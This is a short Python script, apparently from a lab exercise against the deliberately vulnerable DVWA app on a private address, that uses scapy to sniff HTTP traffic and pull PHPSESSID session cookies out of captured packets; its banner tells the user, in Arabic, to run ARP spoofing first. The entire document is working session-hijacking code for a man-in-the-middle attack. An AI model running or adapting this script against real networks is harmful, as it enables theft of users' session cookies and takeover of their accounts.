from scapy.all import *
import re

def grab(pkt):
    if pkt.haslayer(TCP) and Raw in pkt and pkt[TCP].dport == 80:
        load = bytes(pkt[Raw].load).decode(errors='ignore')
        if "192.168.111.130" in load or "PHPSESSID" in load:
            m = re.search(r"PHPSESSID=[a-zA-Z0-9]+", load)
            if m:
                print(f"[{pkt[IP].src} -> {pkt[IP].dst}] {m.group(0)}")

print("[*] Sniffing DVWA sessions... (شغّل ARP spoof أولاً)")
sniff(filter="host 192.168.111.130 and tcp port 80", prn=grab, store=0)
